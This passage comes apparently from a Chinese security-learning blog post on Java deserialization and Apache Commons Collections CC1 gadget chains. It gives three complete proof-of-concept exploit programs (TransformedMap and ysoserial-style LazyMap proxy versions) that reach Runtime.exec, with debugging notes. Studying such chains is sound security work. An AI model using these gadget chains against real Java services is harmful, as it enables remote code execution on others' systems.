<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Test &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap = new HashMap();</span><br><span class="line"></span><br><span class="line">        Map transformerMap = TransformedMap.decorate(hashMap, null , chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(true);</span><br><span class="line"></span><br><span class="line">        InvocationHandler invokerTransformer = (InvocationHandler) constructor.newInstance(Override.class, transformerMap);</span><br><span class="line"></span><br><span class="line">        byte[] poc = Serialize(invokerTransformer);</span><br><span class="line">        UnSerialize(poc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static byte[] Serialize(Object obj) throws IOException &#123;</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        return baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object UnSerialize(byte[] poc) throws IOException, ClassNotFoundException&#123;</span><br><span class="line">        ByteArrayInputStream bais = new ByteArrayInputStream(poc);</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(bais);</span><br><span class="line">        return ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在走入 AnnotationInvocationHandler#readObject 后，预期应该步入 for 循环中直至触发 setValue，但实际上却没能触发循环</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250206123908107.png" class title="image-20250206123908107">

<p>此时 membersValues 值为空，因此 entrySet() 并没有返回值</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250206125415803.png" class title="image-20250206125415803">

<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashMap.put(&quot;abc&quot;, &quot;def&quot;);</span><br></pre></td></tr></table></figure></div>

<p>赋值再看返回值，成功进入到循环体内</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250206125323452.png" class title="image-20250206125323452">

<p>接下来要过几层判断</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、memberType/memberTypes 维护的是注解参数的列表，存储了注解类有关的信息</span><br><span class="line">2、memberType.isInstance(value) ||  value instanceof ExceptionProxy)判断类受否能进行强转，||表示前面为真后面也会为真</span><br></pre></td></tr></table></figure></div>

<p>最终：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.xiinnn;</span><br><span class="line"></span><br><span class="line">import com.sun.prism.shader.DrawCircle_LinearGradient_REPEAT_AlphaTest_Loader;</span><br><span class="line">import com.sun.xml.internal.bind.v2.runtime.reflect.opt.Const;</span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.annotation.Repeatable;</span><br><span class="line">import java.lang.annotation.Target;</span><br><span class="line">import java.lang.instrument.ClassDefinition;</span><br><span class="line">import java.lang.reflect.*;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.*;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line">// import sun.reflect.annotation.AnnotationInvocationHandler;</span><br><span class="line"></span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.annotation.Target;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class Test &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap = new HashMap();</span><br><span class="line">        hashMap.put(&quot;value&quot;, &quot;def&quot;);</span><br><span class="line"></span><br><span class="line">        Map transformerMap = TransformedMap.decorate(hashMap, null , chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(true);</span><br><span class="line"></span><br><span class="line">        InvocationHandler invokerTransformer = (InvocationHandler) constructor.newInstance(Repeatable.class, transformerMap);</span><br><span class="line"></span><br><span class="line">        byte[] poc = Serialize(invokerTransformer);</span><br><span class="line">        UnSerialize(poc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static byte[] Serialize(Object obj) throws IOException &#123;</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        return baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object UnSerialize(byte[] poc) throws IOException, ClassNotFoundException&#123;</span><br><span class="line">        ByteArrayInputStream bais = new ByteArrayInputStream(poc);</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(bais);</span><br><span class="line">        return ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h3 id="Ysoserial-版"><a href="#Ysoserial-版" class="headerlink" title="Ysoserial 版"></a>Ysoserial 版</h3><p>Ysoserial 的链子是利用代理模式，与 TransformedMap 版大有不同。</p>
<p>视线回到 LazyMap#get，接着往前寻找调用 get 方法的类</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250207160256483.png" class title="image-20250207160256483">

<p>在 AnnotationInvocationHandler#invoke 方法中调用了 get，那么如何调用 invoke 呢</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250207160453299.png" class title="image-20250207160453299">

<p>在代理模式中，不会去执行 Map 接口的 get()、entrySet() 等，而是所有这些方法的调用都会被转发到 InvocationHandler 的 invoke() 方法</p>
<p>memberValues 是可控的，而 invoke 处允许执行 get，因此我们传入动态代理对象，同时需要进行类型转换 Map，它的 @NotNull InvocationHandler h 是 inInvocationHandler。</p>
<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250207162507684.png" class title="image-20250207162507684">

<p>设置两层代理，外层代理的 memberValues 赋为 Map 类型代理类，代理对象为 AnnotationInvocationHandler，内层代理的 memberValues 赋为 LazyMap，完成利用链闭合</p>
<p>最终：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Test &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor&lt;?&gt; constructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(true);</span><br><span class="line"></span><br><span class="line">        InvocationHandler inInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, lazyMap);</span><br><span class="line"></span><br><span class="line">        Map proxyMap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]&#123;Map.class&#125;, inInvocationHandler);</span><br><span class="line"></span><br><span class="line">        InvocationHandler outInvocationHandler = (InvocationHandler) constructor.newInstance(Override.class, proxyMap);</span><br><span class="line"></span><br><span class="line">        byte[] poc = Serialize(outInvocationHandler);</span><br><span class="line">        UnSerialize(poc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static byte[] Serialize(Object obj) throws IOException &#123;</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        return baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object UnSerialize(byte[] poc) throws IOException, ClassNotFoundException&#123;</span><br><span class="line">        ByteArrayInputStream bais = new ByteArrayInputStream(poc);</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(bais);</span><br><span class="line">        return ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<img lazyload src="/images/loading.svg" data-src="/2025/03/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95-CC1-CC6/image-20250207181543751.png" class title="image-20250207181543751">











]]></content>
      <categories>
        <category>代码审计</category>
        <category>Java安全审计</category>
      </categories>
      <tags>
        <tag>Java安全</tag>
      </tags>
  </entry>
</search>
